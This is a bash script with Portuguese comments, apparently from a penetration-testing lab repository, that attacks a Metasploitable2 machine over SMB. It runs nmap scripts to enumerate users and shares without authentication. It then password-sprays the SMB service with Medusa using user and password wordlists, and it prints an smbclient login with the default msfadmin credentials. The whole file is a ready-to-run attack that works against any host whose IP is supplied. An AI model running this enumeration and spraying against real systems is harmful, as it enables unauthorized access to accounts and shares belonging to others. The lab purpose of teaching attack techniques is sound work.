#!/usr/bin/env bash
#
# 03_smb_password_spray.sh
# Enumeracao de usuarios via SMB e password spraying contra o
# Metasploitable2.
#
# Password spraying = tentar UMA (ou poucas) senha(s) comuns contra
# MUITOS usuarios, em vez de muitas senhas contra um unico usuario.
# Isso reduz o risco de lockout de conta e e uma tecnica realista
# usada por atacantes contra ambientes corporativos.
#
# Detalhes completos: docs/cenario-3-smb.md
#
# USO:
#   ./03_smb_password_spray.sh <IP_DO_METASPLOITABLE>
#
set -euo pipefail

TARGET="${1:?Uso: $0 <IP_DO_ALVO>}"
USERS="../wordlists/smb_usuarios.txt"
SPRAY_PASSWORDS="../wordlists/smb_senhas.txt"

echo "[*] 1) Enumeracao de usuarios e compartilhamentos via SMB"
echo "    (sem autenticacao -- atencao se isso funcionar, e uma falha grave)"
nmap -p 139,445 --script smb-enum-users,smb-enum-shares "$TARGET"

echo ""
echo "[*] 2) Password spraying com Medusa contra o servico SMB"
echo "    (sem -f, para observar o comportamento contra todos os usuarios)"
medusa -h "$TARGET" -U "$USERS" -P "$SPRAY_PASSWORDS" -M smbnt -t 3

echo ""
echo "[*] 3) Validacao manual (ajuste USER:PASS conforme o resultado acima)"
echo "    smbclient -L $TARGET -U msfadmin%msfadmin"
